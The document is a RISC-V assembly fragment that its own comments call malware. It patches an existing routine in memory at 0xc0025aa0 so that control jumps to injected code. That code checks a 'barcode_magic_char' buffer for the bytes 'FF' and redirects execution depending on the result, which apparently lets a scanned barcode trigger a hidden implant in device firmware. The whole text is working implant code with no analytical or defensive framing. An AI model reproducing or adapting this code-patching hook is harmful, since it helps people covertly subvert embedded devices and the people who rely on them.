    # code to patch in our jump goes here; corresponded to this C:
    #    int *patch_point = (int *)0xc0025aa0;
    #    patch_point[0] = 0xc001d537; // lui a0,0xc001d
    #    patch_point[1] = 0x50050513; // addi a0,a0,1280 # 0xc001d500
    #    patch_point[2] = 0x00050067; // jr a0
    lui     a0, 786470
    addi    a0, a0, -1376
    sw      a0, -12(s0)
    lw      a0, -12(s0)
    lui     a1, 786461
    addi    a1, a1, 1335
    sw      a1, 0(a0)
    lw      a0, -12(s0)
    lui     a1, 327760
    addi    a1, a1, 1299
    sw      a1, 4(a0)
    lw      a0, -12(s0)
    lui     a1, 80
    addi    a1, a1, 103
    sw      a1, 8(a0)
    addi    a0, zero, 2

    nop
    nop
    nop

    # Jump past the barcode check we want to execute-- we don't want to execute it yet!
    # (If we did it would make for some weird control flow)
    # We'll just jump way past all these instructions deeper into malware:
    lui     a0, 0xc001d
    addi    a0, a0, 1792 #0xc001d700
    j .DONE

    # This will be aligned to # 0xc001d500
    nop
    nop

    # load *barcode_magic_char into a0
    lui     a0, 786699
    addi    a0, a0, -1299 # 0xc010aaed;

    # Check for the first 'F'
    lbu     a4, 0(a0) # load byte unsigned @ a0 into a4
    addi    a1, zero, 70 # 70 is the ascii code for "F"
    bne     a4, a1, .FAILURE

    # Check for the next 'F'
    lbu     a4, 1(a0) # load byte unsigned @ a0, offset 1, into a4
    bne     a4, a1, .FAILURE

    # jump to the "this matched our check" location
    lui     a0, 786470
    addi    a0, a0, -1020 # 0xc0025c04
    jr   a0

.FAILURE:
    # jump to the "this failed to matched our check" location
    lui     a0, 786470
    addi    a0, a0, -1364 # 0xc0025aac
    jr   a0

.DONE:
    nop

